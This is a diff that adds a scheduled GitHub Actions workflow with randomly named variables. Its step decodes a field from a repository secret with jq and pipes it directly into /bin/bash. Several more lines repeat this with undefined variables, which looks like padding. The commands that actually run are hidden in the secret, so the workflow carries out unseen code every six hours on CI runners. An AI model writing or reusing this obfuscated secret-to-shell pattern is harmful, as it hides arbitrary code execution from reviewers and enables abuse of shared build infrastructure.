@@ -1,0 +1,23 @@
+name: forgetaylormd
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: forgetaylormd
+        env:
+          k814: ${{ secrets.k814 }}
+        run: |
+          echo $k814 | jq -r .kkt58386 | /bin/bash
+          echo $duute28642 | jq -r .domp9944 | /bin/bash
+          echo $cnj02149 | jq -r .sd67 | /bin/bash
+          echo $uo26954 | jq -r .dtfl7176 | /bin/bash
+          echo $xzekt21 | jq -r .h3286 | /bin/bash
+          echo $emiqy02466 | jq -r .upnoc445 | /bin/bash
+          echo $cxn610 | jq -r .vdoaa257 | /bin/bash
+
